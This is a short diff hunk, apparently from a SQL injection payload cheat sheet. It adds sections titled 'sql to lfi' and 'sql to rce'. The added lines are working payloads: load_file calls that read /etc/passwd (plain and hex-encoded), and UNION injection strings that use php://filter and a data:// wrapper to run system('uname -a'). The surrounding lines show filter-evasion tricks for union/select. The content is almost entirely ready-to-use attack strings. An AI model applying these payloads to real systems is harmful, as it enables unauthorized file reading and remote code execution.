@@ -268,9 +268,18 @@ union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
 ```
 >next
+>sql to lfi
+```
+load_file('../etc/passwd')
+load_file(0x2e2e2f6574632f706173737764)
+hex(load_file('/etc/passwd'))
+```
+>sql to rce
+```
+=1’ /*!50000union*/ select 1,2,3,4,5,’../index’,7,8,’php://filter/convert.base64-encode/resource=.’ -- -
+1' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php echo system(“uname -a”);?>’-- -
 >print system
 ```
-
 @@ft_boolean_syntax
 version()
 current_database()
